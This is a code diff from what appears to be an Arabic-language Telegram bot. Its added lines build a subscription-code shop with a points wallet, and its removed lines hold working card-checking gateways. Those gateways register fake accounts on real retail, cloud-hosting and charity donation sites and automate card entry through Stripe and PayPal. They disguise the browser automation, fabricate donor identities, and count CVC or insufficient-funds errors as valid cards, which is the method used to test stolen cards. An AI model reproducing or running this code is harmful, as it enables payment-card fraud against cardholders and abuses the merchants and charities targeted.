+    async def add_api_key(self, value, label, admin_id):
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("""INSERT INTO api_keys (key_value, label, is_active, created_at, created_by)
+                VALUES (?, ?, 0, ?, ?)""",
+                (value, label, datetime.now().isoformat(), admin_id))
+            await db.commit()
+
+    async def get_active_key(self):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT * FROM api_keys WHERE is_active=1 LIMIT 1") as cur:
+                row = await cur.fetchone()
+                return dict(row) if row else None
+
+    async def list_api_keys(self):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT * FROM api_keys ORDER BY id DESC") as cur:
+                return [dict(r) for r in await cur.fetchall()]
+
+    async def get_key(self, key_id):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT * FROM api_keys WHERE id=?", (key_id,)) as cur:
+                row = await cur.fetchone()
+                return dict(row) if row else None
+
+    async def set_active_key(self, key_id):
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("UPDATE api_keys SET is_active=0")
+            await db.execute("UPDATE api_keys SET is_active=1 WHERE id=?", (key_id,))
+            await db.commit()
+
+    async def delete_api_key(self, key_id):
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("DELETE FROM api_keys WHERE id=?", (key_id,))
+            await db.commit()
+
+    async def record_key_result(self, key_id, success):
+        async with aiosqlite.connect(self.path) as db:
+            if success:
+                await db.execute("UPDATE api_keys SET success_count=success_count+1, last_used=? WHERE id=?",
+                                  (datetime.now().isoformat(), key_id))
+            else:
+                await db.execute("UPDATE api_keys SET fail_count=fail_count+1 WHERE id=?", (key_id,))
+            await db.commit()
+
+    async def save_subscription(self, user_id, data):
+        async with aiosqlite.connect(self.path) as db:
+            expires = (datetime.now() + timedelta(days=data["days"])).isoformat()
+            await db.execute("""INSERT INTO subscriptions
+                (user_id, code, plan, actual_plan, days, max_uses, status, created_at, expires_at, points_spent, api_response)
+                VALUES (?, ?, ?, ?, ?, ?, 'active', ?, ?, ?, ?)""",
+                (user_id, data.get("code", ""), data["plan"], data.get("actual_plan", data["plan"]),
+                 data["days"], data.get("max_uses", 1),
+                 datetime.now().isoformat(), expires, data.get("points_spent", 0),
+                 json.dumps(data.get("response", {}), ensure_ascii=False)))
+            await db.commit()
+
+    async def get_user_subs(self, user_id, limit=20):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT * FROM subscriptions WHERE user_id=? ORDER BY id DESC LIMIT ?",
+                                   (user_id, limit)) as cur:
+                return [dict(r) for r in await cur.fetchall()]
+
+    async def get_last_sub_code(self, user_id):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT code, plan, days FROM subscriptions WHERE user_id=? ORDER BY id DESC LIMIT 1",
+                                   (user_id,)) as cur:
+                row = await cur.fetchone()
+                return dict(row) if row else None
+
+    async def count_subscriptions(self):
+        async with aiosqlite.connect(self.path) as db:
+            async with db.execute("SELECT COUNT(*) FROM subscriptions") as cur:
+                return (await cur.fetchone())[0]
+
+    async def create_drop(self, plan, days, admin_id):
+        token = secrets.token_urlsafe(10)[:12]
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("""INSERT INTO drops (token, plan, days, created_by, created_at, is_active)
+                VALUES (?, ?, ?, ?, ?, 1)""",
+                (token, plan, days, admin_id, datetime.now().isoformat()))
+            await db.commit()
+        return token
+
+    async def get_drop(self, token):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT * FROM drops WHERE token=?", (token,)) as cur:
+                row = await cur.fetchone()
+                return dict(row) if row else None
+
+    async def claim_drop(self, token, user_id, code):
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("""UPDATE drops SET claimed_by=?, claimed_at=?, claim_code=?, is_active=0
+                WHERE token=? AND is_active=1 AND claimed_by IS NULL""",
+                (user_id, datetime.now().isoformat(), code, token))
+            await db.commit()
+
+    async def create_points_drop(self, points, admin_id):
+        token = secrets.token_urlsafe(10)[:12]
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("""INSERT INTO points_drops (token, points, created_by, created_at, is_active)
+                VALUES (?, ?, ?, ?, 1)""",
+                (token, points, admin_id, datetime.now().isoformat()))
+            await db.commit()
+        return token
+
+    async def get_points_drop(self, token):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT * FROM points_drops WHERE token=?", (token,)) as cur:
+                row = await cur.fetchone()
+                return dict(row) if row else None
+
+    async def claim_points_drop(self, token, user_id):
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("""UPDATE points_drops SET claimed_by=?, claimed_at=?, is_active=0
+                WHERE token=? AND is_active=1 AND claimed_by IS NULL""",
+                (user_id, datetime.now().isoformat(), token))
+            await db.commit()
+
+    async def log_admin(self, admin_id, action, details):
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("""INSERT INTO admin_logs (admin_id, action, details, created_at)
+                VALUES (?, ?, ?, ?)""", (admin_id, action, details, datetime.now().isoformat()))
+            await db.commit()
+
+    async def recent_logs(self, limit=20):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT * FROM admin_logs ORDER BY id DESC LIMIT ?", (limit,)) as cur:
+                return [dict(r) for r in await cur.fetchall()]
+
+db = Database()
+
+# ═══════════════════════════════════════════════════════════════════
+# 🌐 عميل API
+# ═══════════════════════════════════════════════════════════════════
+
+def extract_code(resp):
+    if not isinstance(resp, dict):
+        return None
+    data = resp.get("data")
+    if isinstance(data, dict):
+        code = data.get("code")
+        if code:
+            return str(code)
+    return None
+
+class ApiClient:
+    async def _headers(self):
+        active = await db.get_active_key()
+        if not active:
+            return None, None
+        return {"Authorization": f"Bearer {active['key_value'].strip()}",
+                "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, active
+
+    def _sync_call(self, method, headers, **kwargs):
+        response = requests.request(method, API_URL, headers=headers, timeout=30, **kwargs)
+        response.raise_for_status()
+        if response.status_code == 204 or not response.content:
+            return {"success": True}
+        return response.json()
+
+    async def _call(self, method, **kwargs):
+        headers, active = await self._headers()
+        if not headers:
+            return {"ok": False, "error": "no_key", "message": "❌ الخطة غير متوفرة في الوقت الحالي ❌ "}
         try:
-            async with aiohttp.ClientSession() as session:
-                base_url = "https://copenhagensilver.com/my-account/"
-                headers = {
-                    'referer': 'https://copenhagensilver.com/my-account/',
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
-                }
-                
-                # Step 1: Get register nonce
-                register_nonce = await self.get_register_nonce(session, base_url, headers)
-                if not register_nonce:
-                    return False, "❌ Failed to extract register nonce"
-                
-                # Step 2: Register account
-                email, password = await self.register_account(session, base_url, headers, register_nonce)
-                self.email = email
-                self.password = password
-                
-                # Step 3: Get login nonce
-                login_nonce = await self.get_login_nonce(session, base_url, headers)
-                if not login_nonce:
-                    return False, "❌ Failed to extract login nonce"
-                
-                # Step 4: Login
-                await self.login_account(session, base_url, headers, login_nonce, email, password)
-                
-                # Step 5: Get SetupIntent nonce and Stripe PK
-                add_payment_url = "https://copenhagensilver.com/my-account/add-payment-method/"
-                headers['referer'] = 'https://copenhagensilver.com/my-account/payment-methods/'
-                
-                nonce, pk = await self.get_setup_intent_nonce_and_pk(session, add_payment_url, headers)
-                if not nonce or not pk:
-                    return False, "❌ SetupIntent nonce or Stripe PK not found"
-                
-                self.nonce = nonce
-                self.pk = pk
-                
-                # Step 6: Create payment method with Stripe
-                token = await self.create_payment_method(session, card_data, pk)
-                if not token:
-                    return False, "❌ Invalid card"
-                
-                self.token = token
-                
-                # Step 7: Confirm setup intent
-                ajax_url = "https://copenhagensilver.com/wp-admin/admin-ajax.php"
-                confirm_headers = {
-                    'authority': 'copenhagensilver.com',
-                    'accept': '*/*',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': 'https://copenhagensilver.com',
-                    'referer': 'https://copenhagensilver.com/my-account/add-payment-method/',
-                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
-                    'x-requested-with': 'XMLHttpRequest',
-                }
-                
-                success, message = await self.confirm_setup_intent(session, ajax_url, confirm_headers, token, nonce)
-                return success, message
-                
-        except Exception as e:
-            return False, f"⚠️ Error: {str(e)[:50]}"
-
-# ==================== بوابة Real Check ====================
-class RealCheckGateway:
-    
-    def __init__(self):
-        self.user_agents = [
-            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-        ]
-        self.viewports = [
-            {'width': 891, 'height': 1711},
-            {'width': 393, 'height': 852},
-            {'width': 390, 'height': 844},
-        ]
-    
-    def generate_random_email(self) -> str:
-        return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com"
-    
-    async def type_like_human(self, page, selector: str, text: str):
-        await page.locator(selector).click()
-        await asyncio.sleep(random.uniform(0.1, 0.3))
-        for char in text:
-            await page.locator(selector).type(char, delay=random.uniform(0.08, 0.15))
-            await asyncio.sleep(random.uniform(0.02, 0.05))
-    
-    async def type_card_number(self, page, card_number: str):
-        await page.locator("#cardNumber").click()
-        await asyncio.sleep(random.uniform(0.2, 0.4))
-        for i in range(0, len(card_number), 4):
-            group = card_number[i:i+4]
-            for char in group:
-                await page.locator("#cardNumber").type(char, delay=random.uniform(0.08, 0.15))
-            await asyncio.sleep(random.uniform(0.1, 0.25))
-    
-    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
-        random_ua = random.choice(self.user_agents)
-        random_viewport = random.choice(self.viewports)
-        
-        card_result = {"approved": None, "message": None, "card_id": None}
-        response_received = threading.Event()
-        
-        try:
-            async with async_playwright() as p:
-                browser = await p.chromium.launch(headless=True)
-                context = await browser.new_context(
-                    viewport=random_viewport,
-                    user_agent=random_ua
-                )
-                
-                await context.add_init_script("""
-                    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-                    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
-                    window.chrome = { runtime: {} };
-                """)
-                
-                page = await context.new_page()
-                email = self.generate_random_email()
-                password = "Obeida059@"
-                name = card_data.get('name', 'Card Holder')
-                
-                async def handle_response(response):
-                    try:
-                        url = response.url()
-                        
-                        if 'api/v0/billing/cards/' in url and response.status == 200:
-                            try:
-                                data = await response.json()
-                                if data and isinstance(data, dict):
-                                    if data.get('id') or data.get('brand') or data.get('last4'):
-                                        card_result["approved"] = True
-                                        card_result["message"] = "✅ البطاقة مقبولة"
-                                        card_result["card_id"] = data.get('id')
-                                        response_received.set()
-                                        return
-                                elif isinstance(data, list):
-                                    if len(data) == 0:
-                                        card_result["approved"] = False
-                                        card_result["message"] = "❌ البطاقة مرفوضة"
-                                        response_received.set()
-                                        return
-                                    elif len(data) > 0 and isinstance(data[0], dict):
-                                        if data[0].get('id') or data[0].get('brand'):
-                                            card_result["approved"] = True
-                                            card_result["message"] = "✅ البطاقة مقبولة"
-                                            response_received.set()
-                                            return
-                            except:
-                                pass
-                        
-                        if 'api.stripe.com' in url and ('payment_intents' in url or 'payment_methods' in url):
-                            try:
-                                data = await response.json()
-                                if data.get('error'):
-                                    error = data.get('error')
-                                    error_code = error.get('code', '')
-                                    error_message = error.get('message', '').lower()
-                                    if 'cvv' in error_message or 'security' in error_message or error_code == 'incorrect_cvc':
-                                        card_result["approved"] = True
-                                        card_result["message"] = "✅ البطاقة مقبولة"
-                                        response_received.set()
-                                        return
-                                    elif 'insufficient' in error_message:
-                                        card_result["approved"] = True
-                                        card_result["message"] = "✅ البطاقة مقبولة"
-                                        response_received.set()
-                                        return
-                            except:
-                                pass
-                    except:
-                        pass
-                
-                page.on('response', handle_response)
-                
-                await page.goto("https://cloud.vast.ai/create/", timeout=30000)
-                await asyncio.sleep(random.uniform(1.5, 2.5))
-                
-                await page.locator('[data-testid="vast-main-login-button"]').click()
-                await asyncio.sleep(random.uniform(1, 1.5))
-                
-                await self.type_like_human(page, '#\\:r12\\:', email)
-                await asyncio.sleep(random.uniform(0.5, 1))
-                await self.type_like_human(page, '#\\:r14\\:', password)
-                await asyncio.sleep(random.uniform(0.3, 0.6))
-                await self.type_like_human(page, '#\\:r15\\:', password)
-                await asyncio.sleep(random.uniform(0.3, 0.6))
-                
-                await page.locator('div.MuiDialog-root label:nth-of-type(1) input').click()
-                await asyncio.sleep(random.uniform(0.3, 0.6))
-                
-                await page.locator('[data-testid="auth-submit-login-signup"]').click()
-                await asyncio.sleep(random.uniform(3, 4))
-                
-                await page.locator('div:nth-of-type(2) > li:nth-of-type(1) span.vast-typography').click()
-                await asyncio.sleep(random.uniform(2, 3))
-                
-                await page.locator('[data-testid="billing-page-payment-methods-add-card-button"]').click()
-                await asyncio.sleep(random.uniform(4, 6))
-                
-                expiry = f"{card_data['month']}/{card_data['year']}"
-                
-                await self.type_card_number(page, card_data['number'])
-                await asyncio.sleep(random.uniform(0.3, 0.6))
-                
-                await self.type_like_human(page, "#cardExpiry", expiry)
-                await asyncio.sleep(random.uniform(0.2, 0.4))
-                
-                await self.type_like_human(page, "#cardCvc", card_data['cvv'])
-                await asyncio.sleep(random.uniform(0.2, 0.4))
-                
-                await self.type_like_human(page, "#billingName", name)
-                await asyncio.sleep(random.uniform(0.2, 0.4))
-                
-                await page.locator("#billingCountry").click()
-                await asyncio.sleep(random.uniform(0.1, 0.3))
-                await self.type_like_human(page, "#billingCountry", "US")
-                await asyncio.sleep(random.uniform(0.1, 0.3))
-                
-                await self.type_like_human(page, "#billingPostalCode", "90003")
-                await asyncio.sleep(random.uniform(0.3, 0.6))
-                
-                await page.locator('div.SubmitButton-IconContainer').click()
-                
+            loop = asyncio.get_event_loop()
+            data = await loop.run_in_executor(None, lambda: self._sync_call(method, headers, **kwargs))
+            if active:
+                await db.record_key_result(active["id"], True)
+            return {"ok": True, "data": data}
+        except requests.exceptions.HTTPError as e:
+            if active:
+                await db.record_key_result(active["id"], False)
+            code = e.response.status_code if e.response is not None else 0
+            body = ""
+            if e.response is not None:
                 try:
-                    await asyncio.wait_for(response_received.wait(), timeout=25)
-                except:
+                    body = e.response.text[:300]
+                except Exception:
                     pass
-                
-                current_url = page.url
-                page_content = await page.content()
-                
-                await browser.close()
-                
-                if card_result["approved"] is True:
-                    return True, card_result["message"]
-                if card_result["approved"] is False:
-                    return False, card_result["message"]
-                
-                combined_text = (current_url + " " + page_content).lower()
-                
-                if 'billing?session_id=' in current_url:
-                    return True, "✅ البطاقة مقبولة"
-                if 'payment-methods' in current_url and card_data['number'][-4:] in page_content:
-                    return True, "✅ البطاقة مقبولة"
-                if 'stripe.com' in current_url:
-                    if 'cvv' in combined_text or 'security' in combined_text:
-                        return True, "✅ البطاقة مقبولة"
-                    if 'insufficient' in combined_text:
-                        return True, "✅ البطاقة مقبولة"
-                    if 'declined' in combined_text:
-                        return False, "❌ البطاقة مرفوضة"
-                if 'id' in combined_text and card_data['number'][-4:] in combined_text:
-                    return True, "✅ البطاقة مقبولة"
-                
-                return False, "❌ البطاقة مرفوضة"
-                        
+            if code == 401:
+                return {"ok": False, "error": "unauthorized", "message": "🔴  لا يوجد استجابة (401)"}
+            if code == 403:
+                return {"ok": False, "error": "forbidden", "message": "🟡 محظور (403)"}
+            if code == 429:
+                return {"ok": False, "error": "rate_limit", "message": "⏳ تجاوزت الحد (429)"}
+            if code == 400:
+                return {"ok": False, "error": "bad_request", "message": f"❌ طلب خاطئ (400): {body}"}
+            if code == 404:
+                return {"ok": False, "error": "not_found", "message": f"❌ غير موجود (404)"}
+            return {"ok": False, "error": f"http_{code}", "message": f"❌ خطأ HTTP {code}: {body}"}
+        except requests.exceptions.Timeout:
+            if active:
+                await db.record_key_result(active["id"], False)
+            return {"ok": False, "error": "timeout", "message": "⏱️ انتهت المهلة"}
+        except requests.exceptions.ConnectionError:
+            if active:
+                await db.record_key_result(active["id"], False)
+            return {"ok": False, "error": "connection", "message": "🌐 تعذر الاتصال"}
         except Exception as e:
-            print(f"⚠️ خطأ: {e}")
-            return False, "❌ البطاقة مرفوضة"
+            return {"ok": False, "error": "unknown", "message": f"⚠️ {e}"}
 
-# ==================== بوابة PayPal ====================
-class PayPalGateway:
-    
-    FIRST_NAMES = [
-        "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
-        "William","Elizabeth","David","Barbara","Richard","Susan","Joseph","Jessica",
-        "Thomas","Sarah","Christopher","Karen","Daniel","Lisa","Matthew","Nancy",
-        "Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley",
-        "Paul","Dorothy","Andrew","Kimberly","Joshua","Emily","Kenneth","Donna"
-    ]
-    
-    LAST_NAMES = [
-        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
-        "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
-        "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
-        "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker"
-    ]
-    
-    ADDRESSES = [
-        {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
-        {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
-        {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
-        {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
-        {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
-        {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
-        {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
-        {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
-        {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
-        {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
-    ]
-    
-    PHONE_PREFIXES = ["212","310","312","415","602","713","206","305","404","503"]
-    EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]
-    
-    def __init__(self, proxy: Optional[str] = None):
-        self.session = requests.Session()
-        self.session.verify = True
-        self.last_error = ""
-        if proxy:
-            if proxy.count(':') == 3 and '@' not in proxy:
-                p = proxy.split(':')
-                fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
-                self.session.proxies = {"http": fmt, "https": fmt}
-            elif '@' in proxy:
-                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-            else:
-                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-        
-        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
-        self.ajax_headers = {
-            "User-Agent": self.ua,
-            "Accept": "*/*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Origin": "https://awwatersheds.org",
-            "Referer": "https://awwatersheds.org/donate/",
-            "X-Requested-With": "XMLHttpRequest"
-        }
-        self.tokens = {}
-    
-    def random_donor(self) -> Dict[str, str]:
-        first = random.choice(self.FIRST_NAMES)
-        last = random.choice(self.LAST_NAMES)
-        addr = random.choice(self.ADDRESSES)
-        phone = random.choice(self.PHONE_PREFIXES) + ''.join([str(random.randint(0,9)) for _ in range(7)])
-        domain = random.choice(self.EMAIL_DOMAINS)
-        email = f"{first.lower()}{random.randint(10,9999)}@{domain}"
-        return {
-            "first": first,
-            "last": last,
-            "email": email,
-            "phone": phone,
-            "address": addr
-        }
-    
-    def detect_type(self, n: str) -> str:
-        n = n.replace(" ", "").replace("-", "")
-        if n.startswith("4"):
-            return "VISA"
-        elif re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n):
-            return "MASTER_CARD"
-        elif n.startswith(("34", "37")):
-            return "AMEX"
-        elif n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n):
-            return "DISCOVER"
-        return "VISA"
-    
-    def scrape_tokens(self) -> bool:
+    async def create(self, plan, days, max_uses=1):
+        return await self._call("POST", json={"plan": plan, "days": days, "max_uses": max_uses})
+
+    def _test_key_sync(self, key_value):
+        headers = {"Authorization": f"Bearer {key_value.strip()}", "User-Agent": "Mozilla/5.0"}
         try:
-            r = self.session.get("https://awwatersheds.org/donate/", headers={"User-Agent": self.ua}, timeout=20)
-            html = r.text
-            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
-            if not h:
-                h = re.search(r'"base_hash":"(.*?)"', html)
-            if not h:
-                self.last_error = "Hash not found"
-                return False
-            self.tokens['hash'] = h.group(1)
-            pfx = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
-            if pfx:
-                self.tokens['pfx'] = pfx.group(1)
-            fid = re.search(r'name="give-form-id" value="(.*?)"', html)
-            if fid:
-                self.tokens['id'] = fid.group(1)
-            return True
+            r = requests.get(API_URL, headers=headers, timeout=15)
+            if r.status_code == 401: return False, "🔴 غير صالح (401)"
+            if r.status_code in (200, 204): return True, "🟢 صالح"
+            if r.status_code == 403: return False, "🟡 محظور (403)"
+            return True, f"🟢 {r.status_code}"
         except Exception as e:
-            self.last_error = str(e)
-            return False
-    
-    def register_donation(self, donor: Dict[str, str]) -> bool:
-        data = {
-            "give-honeypot": "",
-            "give-form-id-prefix": self.tokens.get('pfx', ''),
-            "give-form-id": self.tokens.get('id', ''),
-            "give-form-title": "Sustainers Circle",
-            "give-current-url": "https://awwatersheds.org/donate/",
-            "give-form-url": "https://awwatersheds.org/donate/",
-            "give-form-hash": self.tokens.get('hash', ''),
-            "give-price-id": "custom",
-            "give-amount": "1.00",
-            "payment-mode": "paypal-commerce",
-            "give_first": donor["first"],
-            "give_last": donor["last"],
-            "give_email": donor["email"],
-            "give-lake-affiliation": "Other",
-            "give_action": "purchase",
-            "give-gateway": "paypal-commerce",
-            "action": "give_process_donation",
-            "give_ajax": "true"
-        }
+            return False, f"⚠️ {e}"
+
+    async def test_key(self, key_value):
+        loop = asyncio.get_event_loop()
+        return await loop.run_in_executor(None, lambda: self._test_key_sync(key_value))
+
+api = ApiClient()
+
+# ═══════════════════════════════════════════════════════════════════
+# ⌨️ نصوص الأزرار
+# ═══════════════════════════════════════════════════════════════════
+
+BTN_SHOP      = "🛒 المتجر"
+BTN_SUBS      = "📦 اشتراكاتي"
+BTN_WALLET    = "💎 محفظتي"
+BTN_EARN      = "🎁 اكسب نقاط"
+BTN_TOP       = "🏆 الصدارة"
+BTN_GUIDE     = "📖 كيف أفعّل"
+BTN_ABOUT     = "ℹ️ عن البوت"
+BTN_ADMIN     = "🛡️ لوحة المشرف"
+BTN_HOME      = "🏠 القائمة الرئيسية"
+BTN_BACK      = "🔙 رجوع"
+
+BTN_PLUS      = "⭐ بلس"
+BTN_PRO       = "💎 برو"
+BTN_PREMIUM   = "👑 بريميوم"
+
+BTN_QTY_1     = "1 كود"
+BTN_QTY_2     = "2 كود"
+BTN_QTY_3     = "3 أكواد"
+BTN_QTY_5     = "5 أكواد"
+BTN_QTY_10    = "10 أكواد"
+BTN_QTY_CUSTOM = "✏️ عدد مخصص"
+BTN_CONFIRM   = "✅ تأكيد الطلب"
+BTN_EDIT_QTY  = "✏️ تعديل العدد"
+BTN_CANCEL    = "❌ إلغاء"
+
+BTN_TRANSFER  = "💸 تحويل نقاط"
+BTN_DAILY     = "🎁 المكافأة اليومية"
+BTN_INVITE    = "🔗 دعوة أصدقاء"
+BTN_MY_ID     = "🆔 معرفي"
+
+BTN_KEYS      = "🔑 إدارة المفاتيح"
+BTN_DROPS     = "🎁 دروب اشتراكات"
+BTN_PDROPS    = "💎 دروب نقاط"
+BTN_STATS     = "📊 إحصائيات"
+BTN_LOGS      = "📜 السجل"
+BTN_ADD_KEY   = "➕ إضافة مفتاح"
+BTN_CREATE_DROP = "➕ إنشاء دروب"
+BTN_CREATE_PDROP = "➕ دروب نقاط"
+
+def is_admin(uid):
+    return uid == SUPER_ADMIN_ID
+
+# ═══════════════════════════════════════════════════════════════════
+# ⌨️ لوحات المفاتيح
+# ═══════════════════════════════════════════════════════════════════
+
+def kb_main(admin=False):
+    rows = [
+        [KeyboardButton(BTN_SHOP), KeyboardButton(BTN_SUBS)],
+        [KeyboardButton(BTN_WALLET), KeyboardButton(BTN_EARN)],
+        [KeyboardButton(BTN_TOP), KeyboardButton(BTN_GUIDE)],
+        [KeyboardButton(BTN_ABOUT)],
+    ]
+    if admin:
+        rows.append([KeyboardButton(BTN_ADMIN)])
+    return ReplyKeyboardMarkup(rows, resize_keyboard=True, is_persistent=True,
+                                input_field_placeholder="اختر...")
+
+def kb_shop():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_PLUS), KeyboardButton(BTN_PRO), KeyboardButton(BTN_PREMIUM)],
+        [KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_days(sub_type):
+    info = SUBSCRIPTION_TYPES[sub_type]
+    days = list(info["prices"].keys())
+    rows = []
+    if len(days) >= 2: rows.append([KeyboardButton(f"{d} يوم") for d in days[:2]])
+    if len(days) > 2: rows.append([KeyboardButton(f"{d} يوم") for d in days[2:]])
+    rows.append([KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)])
+    return ReplyKeyboardMarkup(rows, resize_keyboard=True, is_persistent=True)
+
+def kb_quantity():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_QTY_1), KeyboardButton(BTN_QTY_2)],
+        [KeyboardButton(BTN_QTY_3), KeyboardButton(BTN_QTY_5)],
+        [KeyboardButton(BTN_QTY_10), KeyboardButton(BTN_QTY_CUSTOM)],
+        [KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_confirm():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_CONFIRM)],
+        [KeyboardButton(BTN_EDIT_QTY)],
+        [KeyboardButton(BTN_CANCEL), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_wallet():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_TRANSFER), KeyboardButton(BTN_DAILY)],
+        [KeyboardButton(BTN_INVITE), KeyboardButton(BTN_MY_ID)],
+        [KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_earn():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_DAILY), KeyboardButton(BTN_INVITE)],
+        [KeyboardButton(BTN_MY_ID)],
+        [KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_admin():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_KEYS), KeyboardButton(BTN_DROPS)],
+        [KeyboardButton(BTN_PDROPS), KeyboardButton(BTN_STATS)],
+        [KeyboardButton(BTN_LOGS)],
+        [KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_keys():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_ADD_KEY)],
+        [KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_drops():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_CREATE_DROP)],
+        [KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_pdrops():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton(BTN_CREATE_PDROP)],
+        [KeyboardButton(BTN_BACK), KeyboardButton(BTN_HOME)],
+    ], resize_keyboard=True, is_persistent=True)
+
+def kb_cancel():
+    return ReplyKeyboardMarkup([[KeyboardButton(BTN_CANCEL)]], resize_keyboard=True)
+
+# ═══════════════════════════════════════════════════════════════════
+# 🚀 start + Drops
+# ═══════════════════════════════════════════════════════════════════
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    args = context.args
+    invited_by = None
+
+    if args and args[0].startswith("drop_"):
+        await handle_drop_entry(update, context, args[0].replace("drop_", ""))
+        return
+    if args and args[0].startswith("pdrop_"):
+        await handle_points_drop_entry(update, context, args[0].replace("pdrop_", ""))
+        return
+    if args and args[0].startswith("ref_"):
         try:
-            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=self.ajax_headers, data=data, timeout=20)
-            return r.status_code == 200
-        except:
-            return False
-    
-    def create_order(self) -> Optional[str]:
-        data = {
-            "give-honeypot": "",
-            "give-form-id-prefix": self.tokens.get('pfx', ''),
-            "give-form-id": self.tokens.get('id', ''),
-            "give-form-hash": self.tokens.get('hash', ''),
-            "payment-mode": "paypal-commerce",
